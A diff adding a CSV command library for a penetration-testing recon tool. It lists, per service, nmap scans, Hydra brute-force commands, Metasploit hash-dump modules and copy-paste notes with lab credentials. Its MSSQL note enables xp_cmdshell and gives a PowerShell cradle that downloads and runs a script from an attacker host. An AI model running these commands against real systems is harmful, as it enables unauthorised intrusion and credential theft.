@@ -1,0 +1,293 @@
+Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
+Nmap,Nmap,Generic Scans,Kickoff Scan,"Quick scan, Version scan, All Port Scan, UDP Scan ran one at a time in order",nmap -Pn {IP} && nmap -Pn -sS -p- {IP} && nmap -sC -sV -Pn {IP} && nmap -p- -Pn {IP} && sudo nmap -Pn -p- -sU {IP},Verified,1
+Nmap,Nmap,Generic Scans,Quick Scan,Quick Nmap Scan,nmap {IP},Verified,2
+Nmap,Nmap,Generic Scans,Version Scan,Scan for the Version of the Open Ports,nmap -sC -sV {IP},Verified,3
+Nmap,Nmap,Generic Scans,All Port Scan,Scan for all open ports,nmap -p- -Pn {IP},Verified,4
+Nmap,Nmap,Generic Scans,Quiet Scan,Scan Quietly,nmap -Pn -sS -p- {IP},Verified,5
+Nmap,Nmap,Generic Scans,UDP Scan,Scan for Open UDP Ports,nmap -Pn -p- -sU {IP},Verified,6
+IMAP,"143,993",Internet Message Access Protocol,Notes,Notes for WHOIS,"#As its name implies, IMAP allows you to access your email messages wherever you are; much of the time, it is accessed via the Internet. Basically, email messages are stored on servers. Whenever you check your inbox, your email client contacts the server to connect you with your messages. When you read an email message using IMAP, you aren't actually downloading or storing it on your computer; instead, you are reading it off of the server. As a result, it's possible to check your email from several different devices without missing a thing.
+
+https://book.hacktricks.xyz/pentesting/pentesting-imap
+",Verified,1
+IMAP,"143,993",Internet Message Access Protocol,Banner Grab,Banner Grab 143,nc -nv {IP} 143,Verified,2
+IMAP,"143,993",Internet Message Access Protocol,Secure Banner Grab,Banner Grab 993,openssl s_client -connect {IP}:993 -quiet,Verified,3
+IMAP,"143,993",Internet Message Access Protocol,consolesless mfs enumeration,IMAP enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS {IP}; set RPORT 143; run; exit',Verified,4
+LDAP,"389,636",Lightweight Directory Access Protocol,Notes,Notes for LDAP,"#LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a ""lightweight"" (smaller amount of code) version of Directory Access Protocol (DAP).
+
+https://book.hacktricks.xyz/pentesting/pentesting-ldap
+",Verified,1
+LDAP,"389,636",Lightweight Directory Access Protocol,Banner Grab,Grab LDAP Banner,nmap -p 389 --script ldap-search -Pn {IP},Verified,2
+LDAP,"389,636",Lightweight Directory Access Protocol,LdapSearch,Base LdapSearch,ldapsearch -H ldap://{IP} -x,Verified,3
+LDAP,"389,636",Lightweight Directory Access Protocol,LdapSearch Naming Context Dump,Attempt to get LDAP Naming Context,ldapsearch -H ldap://{IP} -x -s base namingcontexts,Verified,4
+LDAP,"389,636",Lightweight Directory Access Protocol,LdapSearch Big Dump,Need Naming Context to do big dump,"ldapsearch -H ldap://{IP} -x -b ""{Naming_Context}""",Verified,5
+LDAP,"389,636",Lightweight Directory Access Protocol,Hydra Brute Force,Need User,hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f,Verified,6
+Web,"80,443",Web,Notes,Notes for Web,"#https://book.hacktricks.xyz/pentesting/pentesting-web
+",Verified,1
+Web,"80,443",Web,Quick Web Scan,Nikto and GoBuster,nikto -host {Web_Proto}://{IP}:{Web_Port} &&&& gobuster dir -w {Small_Dirlist} -u {Web_Proto}://{IP}:{Web_Port} && gobuster dir -w {Big_Dirlist} -u {Web_Proto}://{IP}:{Web_Port},Verified,2
+Web,"80,443",Web,Nikto,Basic Site Info via Nikto,nikto -host {Web_Proto}://{IP}:{Web_Port},Verified,3
+Web,"80,443",Web,WhatWeb,General purpose auto scanner,whatweb -a 4 {IP},Verified,4
+Web,"80,443",Web,Directory Brute Force Non-Recursive,Non-Recursive Directory Brute Force,gobuster dir -w {Big_Dirlist} -u {Web_Proto}://{IP}:{Web_Port},Verified,5
+Web,"80,443",Web,Directory Brute Force Recursive,Recursive Directory Brute Force,"python3 {Tool_Dir}dirsearch/dirsearch.py -w {Small_Dirlist} -e php,exe,sh,py,html,pl -f -t 20 -u {Web_Proto}://{IP}:{Web_Port} -r 10",Verified,6
+Web,"80,443",Web,Directory Brute Force CGI,Common Gateway Interface Brute Force,gobuster dir -u {Web_Proto}://{IP}:{Web_Port}/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200,Verified,7
+Web,"80,443",Web,Nmap Web Vuln Scan,Tailored Nmap Scan for web Vulnerabilities,"nmap -vv --reason -Pn -sV -p {Web_Port} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {IP}",Verified,8
+Web,"80,443",Web,Drupal,Drupal Enumeration Notes,"#git clone https://github.com/immunIT/drupwn.git for low hanging fruit and git clone https://github.com/droope/droopescan.git for deeper enumeration
+",Verified,9
+Web,"80,443",Web,WordPress,WordPress Enumeration with WPScan,"?What is the location of the wp-login.php? Example: /Yeet/cannon/wp-login.php
+wpscan --url {Web_Proto}://{IP}{1} --enumerate ap,at,cb,dbe && wpscan --url {Web_Proto}://{IP}{1} --enumerate u,tt,t,vp --passwords {Big_Passwordlist} -e
+",Verified,10
+Web,"80,443",Web,WordPress Hydra Brute Force,Need User (admin is default),hydra -l admin -P {Big_Passwordlist} {IP} -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location',Verified,11
+Web,"80,443",Web,Ffuf Vhost,Simple Scan with Ffuf for discovering additional vhosts,"ffuf -w {Subdomain_List}:FUZZ -u {Web_Proto}://{Domain_Name} -H ""Host:FUZZ.{Domain_Name}"" -c -mc all {Ffuf_Filters}",Verified,12
+MySql,3306,MySql,Notes,Notes for MySql,"#MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).
+
+https://book.hacktricks.xyz/pentesting/pentesting-mysql
+",Verified,1
+MySql,3306,MySql,Nmap,Nmap with MySql Scripts,"nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306",Verified,2
+MySql,3306,MySql,MySql,Attempt to connect to mysql server,mysql -h {IP} -u {Username}@localhost,Verified,3
+MySql,3306,MySql,MySql consolesless mfs enumeration,MySql enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit',Verified,4
+NFS,2049,Network File System,Notes,Notes for NFS,"#It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.
+
+#apt install nfs-common
+showmount 10.10.10.180      ~or~showmount -e 10.10.10.180
+should show you available shares (example /home)
+
+mount -t nfs -o ver=2 10.10.10.180:/home /mnt/
+cd /mnt
+nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in
+
+https://book.hacktricks.xyz/pentesting/nfs-service-pentesting
+",Verified,1
+NFS,2049,Network File System,Nmap,Nmap with NFS Scripts,"nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 {IP}",Verified,2
+DNS,53,Domain Name Service,Notes,Notes for DNS,"##These are the commands I run every time I see an open DNS port
+
+dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}
+dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name}
+dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}
+dig axfr @{IP}
+dig axfr {Domain_Name} @{IP}
+nslookup
+    SERVER {IP}
+    127.0.0.1
+    {IP}
+    Domain_Name
+    exit
+
+https://book.hacktricks.xyz/pentesting/pentesting-dns
+",Verified,1
+DNS,53,Domain Name Service,Banner Grab,Grab DNS Banner,dig version.bind CHAOS TXT @DNS,Verified,2
+DNS,53,Domain Name Service,Nmap Vuln Scan,Scan for Vulnerabilities with Nmap,"nmap -n --script ""(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"" {IP}",Verified,3
+DNS,53,Domain Name Service,Zone Transfer,Three attempts at forcing a zone transfer,dig axfr @{IP} && dix axfr @{IP} {Domain_Name} && fierce --dns-servers {IP} --domain {Domain_Name},Verified,4
+DNS,53,Domain Name Service,Active Directory,Eunuerate a DC via DNS,"dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args ""dns-srv-enum.domain={Domain_Name}""",Verified,5
+DNS,53,Domain Name Service,consolesless mfs enumeration,DNS enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/dns/dns_amp; set RHOSTS {IP}; set RPORT 53; run; exit' && msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS {IP}; set RPORT 53; run; exit',Verified,6
+MSSQL,1433,Microsoft SQL Server,Notes,Notes for MSSQL,"#Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
+
+#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
+
+###the goal is to get xp_cmdshell working###
+1. try and see if it works
+    xp_cmdshell `whoami`
+    go
+
+2. try to turn component back on
+    EXEC SP_CONFIGURE 'xp_cmdshell' , 1
+    reconfigure
+    go
+    xp_cmdshell `whoami`
+    go
+
+3. 'advanced' turn it back on
+    EXEC SP_CONFIGURE 'show advanced options', 1
+    reconfigure
+    go
+    EXEC SP_CONFIGURE 'xp_cmdshell' , 1
+    reconfigure
+    go
+    xp_cmdshell 'whoami'
+    go
+
+
+
+
+xp_cmdshell ""powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')""
+
+
+https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+",Verified,1
+MSSQL,1433,Microsoft SQL Server,Nmap for SQL,Nmap with SQL Scripts,"nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}",Verified,2
+MSSQL,1433,Microsoft SQL Server,MSSQL consolesless mfs enumeration,MSSQL enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit',Verified,3
+SMTP,"25,465,587",Simple Mail Transfer Protocol,Notes,Notes for SMTP,"#SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.
+
+https://book.hacktricks.xyz/pentesting/pentesting-smtp
+",Verified,1
+SMTP,"25,465,587",Simple Mail Transfer Protocol,Banner Grab,Grab SMTP Banner,nc -vn {IP} 25,Verified,2
+SMTP,"25,465,587",Simple Mail Transfer Protocol,SMTP Vuln Scan,SMTP Vuln Scan With Nmap,"nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}",Verified,3
+SMTP,"25,465,587",Simple Mail Transfer Protocol,SMTP User Enum,Enumerate uses with smtp-user-enum,smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP},Verified,4
+SMTP,"25,465,587",Simple Mail Transfer Protocol,SMTPS Connect,Attempt to connect to SMTPS two different ways,openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587,Verified,5
+SMTP,"25,465,587",Simple Mail Transfer Protocol,Find MX Servers,Find MX servers of an organization,dig +short mx {Domain_Name},Verified,6
+SMTP,"25,465,587",Simple Mail Transfer Protocol,Hydra Brute Force,Need Nothing,hydra -P {Big_Passwordlist} {IP} smtp -V,Verified,7
+SMTP,"25,465,587",Simple Mail Transfer Protocol,consolesless mfs enumeration,SMTP enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit',Verified,8
+FTP,21,File Transfer Protocol,Notes,Notes for FTP,"#Anonymous Login
+-bi     <<< so that your put is done via binary
+
+wget --mirror 'ftp://ftp_user:UTDRSCH53c""$6hys@10.10.10.59'
+^^to download all dirs and files
+
+wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' 
+if PASV transfer is disabled
+
+https://book.hacktricks.xyz/pentesting/pentesting-ftp
+",Verified,1
+FTP,21,File Transfer Protocol,Banner Grab,Grab FTP Banner via telnet,telnet -n {IP} 21,Verified,2
+FTP,21,File Transfer Protocol,Cert Grab,Grab FTP Certificate if existing,openssl s_client -connect {IP}:21 -starttls ftp,Verified,3
+FTP,21,File Transfer Protocol,nmap ftp,Anon login and bounce FTP checks are performed,nmap --script ftp-* -p 21 {IP},Verified,4
+FTP,21,File Transfer Protocol,Browser Connection,Connect with Browser,#ftp://anonymous:anonymous@{IP},Verified,5
+FTP,21,File Transfer Protocol,Hydra Brute Force,Need Username,hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp,Verified,6
+FTP,21,File Transfer Protocol,consolesless mfs enumeration ftp,FTP enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' &&  msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit',Verified,7
+Ident,113,Identification Protocol,Notes,Notes for Ident,"#Is an Internet protocol that helps identify the user of a particular TCP connection.
+
+https://book.hacktricks.xyz/pentesting/113-pentesting-ident
+",Verified,1
+Ident,113,Identification Protocol,Enum Users,Enumerate Users,#apt install ident-user-enum    ident-user-enum {IP} 22 23 139 445 (try all open ports),Verified,2
+WinRM,5985,Windows Remote Managment,Notes,Notes for WinRM,"#Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.
+
+sudo gem install winrm winrm-fs colorize stringio 
+git clone https://github.com/Hackplayers/evil-winrm.git 
+cd evil-winrm
+ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’
+
+https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/
+
+ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
+^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
+menu
+invoke-binary `tab`
+
+#python3
+import winrm
+s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
+print(s.run_cmd('ipconfig'))
+print(s.run_ps('ipconfig'))
+
+https://book.hacktricks.xyz/pentesting/pentesting-winrm
+",Verified,1
+WinRM,5985,Windows Remote Managment,Hydra Brute Force,Need User,hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP},Verified,2
+Kerberos,88,AD Domain Authentication,Notes,Notes for Kerberos,"#Firstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access.
+Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is the responsability of each service to determine if the user has access to its resources.
+
+https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+",Verified,1
+Kerberos,88,AD Domain Authentication,Pre-Creds,Brute Force to get Usernames,"nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=""{Domain_Name}"",userdb={Big_Userlist} {IP}",Verified,2
+Kerberos,88,AD Domain Authentication,With Usernames,Brute Force with Usernames and Passwords,#consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h,Verified,3
+Kerberos,88,AD Domain Authentication,With Creds,Attempt to get a list of user service principal names,GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs,Verified,4
+Netbios,"137,138,139",Netbios,Notes,Notes for NetBios,"#Name service for name registration and resolution (ports: 137/udp and 137/tcp).
+Datagram distribution service for connectionless communication (port: 138/udp).
+Session service for connection-oriented communication (port: 139/tcp).
+
+Every machine should have a name inside the NetBios network. To request a name, a machine should send a ""Name Query"" packet in broadcast and if anyone answer that it is already using that name, the machine can use that name. If there is a Name Service server, the computer could ask the Name Service server if someone is using the name that it wants to use.
+
+https://book.hacktricks.xyz/pentesting/137-138-139-pentesting-netbios
+",Verified,1
+Netbios,"137,138,139",Netbios,Find Names,Three scans to find the names of the server,nmblookup -A {IP} &&&& nbtscan {IP}/30 &&&& nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n {IP},Verified,2
+SNMP,161,Simple Network Managment Protocol,Notes,Notes for SNMP,"#SNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).
+
+https://book.hacktricks.xyz/pentesting/pentesting-snmp
+",Verified,1
+SNMP,161,Simple Network Managment Protocol,SNMP Check,Enumerate SNMP,snmp-check {IP},Verified,2
+SNMP,161,Simple Network Managment Protocol,OneSixtyOne,Crack SNMP passwords,onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100,Verified,3
+SNMP,161,Simple Network Managment Protocol,Nmap,Nmap snmp (no brute),"nmap --script ""snmp* and not snmp-brute"" {IP}",Verified,4
+SNMP,161,Simple Network Managment Protocol,Hydra Brute Force,Need Nothing,hydra -P {Big_Passwordlist} -v {IP} snmp,Verified,5
+Telnet,23,Telnet,Notes,Notes for t=Telnet,"#wireshark to hear creds being passed
+tcp.port == 23 and ip.addr != myip
+
+https://book.hacktricks.xyz/pentesting/pentesting-telnet
+",Verified,1
+Telnet,23,Telnet,Banner Grab,Grab Telnet Banner,nc -vn {IP} 23,Verified,2
+Telnet,23,Telnet,Nmap with scripts,Run nmap scripts for telnet,"nmap -n -sV -Pn --script ""*telnet*"" -p 23 {IP}",Verified,3
+Telnet,23,Telnet,consoleless mfs enumeration,Telnet enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit',Verified,4
+Java RMI,"1090,1098,1099,1199,4443-4446,8999-9010,9999",Java Remote Method Invocation,Enumeration,Perform basic enumeration of an RMI service,rmg enum {IP} {PORT},Verified,1
+Portmapper,43,PM or RPCBind,Notes,Notes for PortMapper,"#Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service.
+
+https://book.hacktricks.xyz/pentesting/pentesting-rpcbind
+",Verified,1
+Portmapper,43,PM or RPCBind,rpc info,May give netstat-type info,whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43,Verified,2
+Portmapper,43,PM or RPCBind,nmap,May give netstat-type info,nmap -sSUC -p 111 {IP},Verified,3
+Oracle,1521,Oracle TNS Listener,Notes,Notes for Oracle,"#Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation
+
+#great oracle enumeration tool
+navigate to https://github.com/quentinhardy/odat/releases/
+download the latest
+tar -xvf odat-linux-libc2.12-x86_64.tar.gz
+cd odat-libc2.12-x86_64/
+./odat-libc2.12-x86_64 all -s 10.10.10.82
+
+for more details check https://github.com/quentinhardy/odat/wiki
+
+https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
+",Verified,1
+Oracle,1521,Oracle TNS Listener,Nmap,Nmap with Oracle Scripts,"nmap --script ""oracle-tns-version"" -p 1521 -T4 -sV {IP}",Verified,2
+SMB,"137,138,139",Server Message Block,Notes,Notes for SMB,"#While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
+
+#These are the commands I run in order every time I see an open SMB port
+
+With No Creds
+nbtscan {IP}
+smbmap -H {IP}
+smbmap -H {IP} -u null -p null
+smbmap -H {IP} -u guest
+smbclient -N -L //{IP}
+smbclient -N //{IP}/ --option=""client min protocol""=LANMAN1
+rpcclient {IP}
+rpcclient -U """" {IP}
+crackmapexec smb {IP}
+crackmapexec smb {IP} --pass-pol -u """" -p """"
+crackmapexec smb {IP} --pass-pol -u ""guest"" -p """"
+GetADUsers.py -dc-ip {IP} ""{Domain_Name}/"" -all
+GetNPUsers.py -dc-ip {IP} -request ""{Domain_Name}/"" -format hashcat
+GetUserSPNs.py -dc-ip {IP} -request ""{Domain_Name}/""
+getArch.py -target {IP}
+
+With Creds
+smbmap -H {IP} -u {Username} -p {Password}
+smbclient ""\\\\{IP}\\\"" -U {Username} -W {Domain_Name} -l {IP}
+smbclient ""\\\\{IP}\\\"" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
+crackmapexec smb {IP} -u {Username} -p {Password} --shares
+GetADUsers.py {Domain_Name}/{Username}:{Password} -all
+GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
+GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request
+
+https://book.hacktricks.xyz/pentesting/pentesting-smb
+",Verified,1
+SMB,"137,138,139",Server Message Block,Enum4Linux,General SMB Scan,enum4linux -a {IP},Verified,2
+SMB,"137,138,139",Server Message Block,Nmap SMB Scan 1,SMB Vuln Scan With Nmap,"nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}",Verified,3
+SMB,"137,138,139",Server Message Block,Nmap Smb Scan 2,SMB Vuln Scan With Nmap (Less Specific),"nmap --script smb-vuln* -Pn -p 139,445 {IP}",Verified,4
+SMB,"137,138,139",Server Message Block,Hydra Brute Force,Need User,hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb,Verified,5
+SMB,"137,138,139",Server Message Block,SMB/SMB2 139/445 consolesless mfs enumeration,SMB/SMB2 139/445  enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit',Verified,6
+POP,110,Post Office Protocol,Notes,Notes for POP,"#Post Office Protocol (POP) is a type of computer networking and Internet standard protocol that extracts and retrieves email from a remote mail server for access by the host machine. POP is an application layer protocol in the OSI model that provides end users the ability to fetch and receive email (from here).
+The POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.
+
+https://book.hacktricks.xyz/pentesting/pentesting-whois
+",Verified,1
+POP,110,Post Office Protocol,Banner Grab,Banner Grab 110,nc -nv {IP} 110,Verified,2
+POP,110,Post Office Protocol,Banner Grab 995,Grab Banner Secure,openssl s_client -connect {IP}:995 -crlf -quiet,Verified,3
+POP,110,Post Office Protocol,Nmap,Scan for POP info,"nmap --script ""pop3-capabilities or pop3-ntlm-info"" -sV -p 110 {IP}",Verified,4
+POP,110,Post Office Protocol,Hydra Brute Force,Need User,hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V,Verified,5
+POP,110,Post Office Protocol,consolesless mfs enumeration,POP3 enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS {IP}; set RPORT 110; run; exit',Verified,6
+SSH,22,Secure Shell Hardening,Hydra Brute Force,Need Username,hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 -u {IP} ssh,Verified,1
+SSH,22,Secure Shell Hardening,consolesless mfs enumeration,SSH enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit',Verified,2
+NTP,123,Network Time Protocol,Notes,Notes for NTP,"#The Network Time Protocol (NTP) is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks.
+
+https://book.hacktricks.xyz/pentesting/pentesting-ntp
+",Verified,1
+NTP,123,Network Time Protocol,Nmap,Enumerate NTP,"nmap -sU -sV --script ""ntp* and (discovery or vuln) and not (dos or brute)"" -p 123 {IP}",Verified,2
+RDP,3389,Remote Desktop Protocol,Notes,Notes for RDP,"#Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software 
+
+https://book.hacktricks.xyz/pentesting/pentesting-rdp
+",Verified,1
+RDP,3389,Remote Desktop Protocol,Nmap,Nmap with RDP Scripts,"nmap --script ""rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info"" -p 3389 -T4 {IP}",Verified,2
+Help,Help,Help Menu,Pro Tips,Pro Tips and Hot Keys,"#Pro Tips Run multiple commands from a table at once by splitting the command numbers with commas. EX: 0,1,2 (Spaces and periods work aswell)
+",Verified,1
+Help,Help,Help Menu,Adding Commands and Notes,Substitue and append your methodology to HAC,"#Adding Rows Open Main.csv with your favorite csv editor (I'm partial to ModernCSV). When adding a command, keep in mind Name, Port, and Description are for the primary display screen; Cmd_Name, Cmd_Description, Cmd_Command, Cmd_Comment, and SubDisplayOrder are for the secondary display screen. Special Characters and Syntax Cmd_Command has a few special characters including &&&&, #, ##, ?, and {}. &&&& &&&& Anywhere in the command will split the line and start each command individually in separate tabs. Example: whoami &&&& id &&&& ifconfig will open three tabs and run the desired command in each. &&&& is useful if you initially run multiple separate commands every time you see a specific port open. # and ## ""#"" is for sending yourself notes to another tab. ""#"" can be useful if you don't want to run a command, but you want to give yourself copy-paste notes for manual enumeration. Set only the first character of the line to # if you want variables to be evaluated. Set the first two characters of the line to ## if you do not want variables to be evaluated. ? ""?"" is for sending a question to the user. The responce will be set to a numbered variable. You can send multiple lines of questions for multiple variables. Example: ?What is the location of the wp-login.php? Example: /Yeet/cannon/wp-login.php ?What is a known password you would like to brute force? wpscan --url {Web_Proto}://{IP}{1} --enumerate ap,at,cb,dbe && wpscan --url {Web_Proto}://{IP}{1} --enumerate u,tt,t,vp --password {2} -e {} {} is for grabbing a variable from TmuxRecon. Available variables can be viewed in the variables table.
+",Verified,2
